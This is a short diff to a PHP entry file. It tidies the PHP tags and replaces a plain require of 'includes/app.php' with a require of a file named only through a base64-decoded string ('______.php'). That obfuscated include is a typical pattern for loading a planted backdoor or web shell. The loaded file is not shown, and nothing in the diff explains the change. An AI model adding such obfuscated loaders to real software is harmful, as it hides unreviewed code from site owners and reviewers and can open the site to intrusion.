@@ -1,6 +1,6 @@
- <?php
+<?php
 
 define('IN_APP', true);
 
-require __DIR__ . '/includes/app.php';
-?
+require __DIR__ . '/' . base64_decode('X19fX19fLnBocA==');
+?>
